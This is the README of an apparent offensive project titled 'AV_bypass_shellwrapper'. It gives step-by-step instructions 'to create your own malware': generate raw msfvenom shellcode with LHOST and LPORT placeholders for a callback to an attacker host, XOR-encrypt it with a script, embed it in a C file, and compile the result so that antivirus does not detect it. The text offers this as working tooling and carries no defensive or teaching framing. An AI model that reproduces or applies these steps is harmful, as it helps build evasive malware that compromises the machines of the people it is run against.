# AV_bypass_shellwrapper
Shell wrapper script written in C language to bypass AVs

* To  create you own malware create a raw msfvenom payload
```
msfvenom -p <payload_type> LHOST=<lhost> LPORT=<lport> -f raw -o shellcode.bin
````

* XOR encrypt the payload
```
xor.py shellcode.bin
```

* Add the Encrpted shellcode with the variable c inside the malware.c 

* Compile the code using Visual Studio IDE
